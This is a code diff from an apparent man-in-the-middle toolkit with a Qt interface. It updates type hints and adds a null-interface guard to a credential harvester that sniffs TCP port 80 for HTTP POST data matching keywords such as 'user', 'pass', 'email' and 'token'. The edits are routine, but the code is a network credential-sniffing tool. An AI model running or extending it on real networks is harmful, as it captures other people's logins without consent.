@@ -14,12 +14,12 @@ from typing import TYPE_CHECKING
 from core.mitm._scapy import Raw, TCP, IP, sniff, conf
 
 if TYPE_CHECKING:
-    from PySide6.QtCore import Signal
+    from PySide6.QtCore import SignalInstance
 
 _KEYWORDS = ["user", "pass", "email", "pwd", "login", "auth", "token", "name"]
 
 
-def _parse_http_packet(packet: object, passive_log_signal: Signal) -> None:  # type: ignore[type-arg]
+def _parse_http_packet(packet: object, passive_log_signal: SignalInstance) -> None:
     try:
         if not packet.haslayer(Raw) or not packet.haslayer(TCP):  # type: ignore[union-attr]
             return
@@ -48,16 +48,18 @@ def _parse_http_packet(packet: object, passive_log_signal: Signal) -> None:  # t
 
 def run_credential_harvester(
     running_flag: list[bool],
-    log_signal: Signal,  # type: ignore[type-arg]
-    passive_log_signal: Signal,  # type: ignore[type-arg]
-    harvester_status_changed: Signal,  # type: ignore[type-arg]
+    log_signal: SignalInstance,
+    passive_log_signal: SignalInstance,
+    harvester_status_changed: SignalInstance,
 ) -> None:
     """Passively sniff TCP port 80 for HTTP POST credential data."""
     passive_log_signal.emit("Credential Harvester Active. Listening on TCP Port 80...", "INFO")
     harvester_status_changed.emit(True)
     while running_flag[0]:
         try:
-            sniff(
+            if conf is None or conf.iface is None:
+                break
+            sniff(  # type: ignore[misc]
                 filter="tcp port 80",
                 iface=conf.iface,
                 prn=lambda pkt: _parse_http_packet(pkt, passive_log_signal),
